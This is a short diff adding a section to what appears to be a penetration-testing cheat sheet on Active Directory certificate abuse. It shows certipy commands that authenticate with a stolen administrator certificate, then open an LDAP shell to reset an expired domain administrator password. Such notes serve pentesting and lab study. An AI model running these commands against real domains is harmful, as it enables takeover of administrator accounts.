@@ -1069,6 +1069,19 @@ certipy-ad req \
 3/ Authenticate using the certificate :
 certipy auth -pfx 'administrator.pfx' -dc-ip $target
 
+# Admin Password Expired :
+
+==> Suppose we get the admin.pfx , but when we try to generate our TGT we can't due to the fact that the Admin password is expired , we can attempt an LDAP Shell and try resetting the Admin Password to something else .
+Eg :
+certipy-ad auth -pfx 'administrator.pfx' -dc-ip $target
+[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_KEY_EXPIRED(Password has expired; change password to reset)
+
+Fix :
+certipy-ad auth -pfx 'administrator.pfx' -dc-ip $target -ldap-shell
+==> This will drop us inside an LDAP Shell : 
+#
+#change_password administrator NewPassword123!
+
 
 # ESC8 Abuse :
 
